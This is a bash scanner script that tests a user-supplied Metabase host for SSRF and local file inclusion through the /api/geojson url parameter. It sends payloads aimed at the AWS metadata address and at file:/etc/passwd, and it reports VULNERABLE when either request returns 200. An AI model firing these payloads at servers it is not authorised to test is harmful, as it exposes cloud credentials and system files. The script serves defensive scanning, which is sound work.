#!/bin/bash

# Script to check for SSRF vulnerability on a Metabase server hosted on AWS

# Prompt the user for the host value
read -p "Enter host value (e.g. example.com:PORT): " host

# Build the URL to check for SSRF vulnerability

ssrf_url="$host/api/geojson?url=http://169.254.169.254/latest/meta-data"
lfi_url="$host/api/geojson?url=file:/etc/passwd"
# Make an HTTP GET request to the URL

lfi_response=$(curl -s -o /dev/null -w '%{http_code}' $lfi_url)
ssrf_response=$(curl -s -o /dev/null -w '%{http_code}' $ssrf_url)

# Check the response code

if [ $ssrf_response -eq 200 ] && [ $lfi_response -eq 200 ]; then
echo "VULNERABLE: Both SSRF and LFI detected in $ssrf_url and $lfi_url"
elif [ $ssrf_response -eq 200 ]; then
echo "VULNERABLE: SSRF detected in $ssrf_url"
elif [ $lfi_response -eq 200 ]; then
echo "VULNERABLE: LFI detected in $lfi_url"
else
echo "Not Vulnerable"
fi
